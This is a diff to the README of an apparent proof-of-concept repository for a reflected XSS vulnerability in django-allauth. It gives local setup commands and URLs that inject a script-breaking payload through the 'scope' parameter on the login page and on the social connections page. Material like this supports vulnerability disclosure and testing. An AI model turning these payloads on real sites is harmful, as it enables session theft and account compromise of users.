@@ -1,12 +1,28 @@
-# poc-xss-django-allauth
+# Proof of concept for a XSS vulnerability in django-allauth
+
+## Requirements
+
+- Python
+- [uv](https://docs.astral.sh/uv/getting-started/installation/)
 
 ## Set up
 
-- `uv run manage.py migrate`
-- `uv run manage.py createsuperuser`
-- `uv run manage.py runserver`
+```bash
+$ git clone https://github.com/stsewd/poc-xss-django-allauth
+$ cd poc-xss-django-allauth
+$ uv run manage.py migrate
+# Create a user to log into the application.
+$ uv run manage.py createsuperuser
+$ uv run manage.py runserver
+```
 
-## PoC
+## Proof of concept
 
-- While logged out, go to `http://127.0.0.1:8000/accounts/login/?scope=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E`
-- While logged in, go to `http://127.0.0.1:8000/accounts/3rdparty/?scope=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E`
+**XSS in login page**
+
+- While logged out, go to ``http://127.0.0.1:8000/accounts/login/?scope=</script><script>alert(document.domain)</script><script>``
+
+**XSS in social connections page**
+
+- Log in with the user you created.
+- Go to ``http://127.0.0.1:8000/accounts/3rdparty/?scope=</script><script>alert(document.domain)</script><script>``
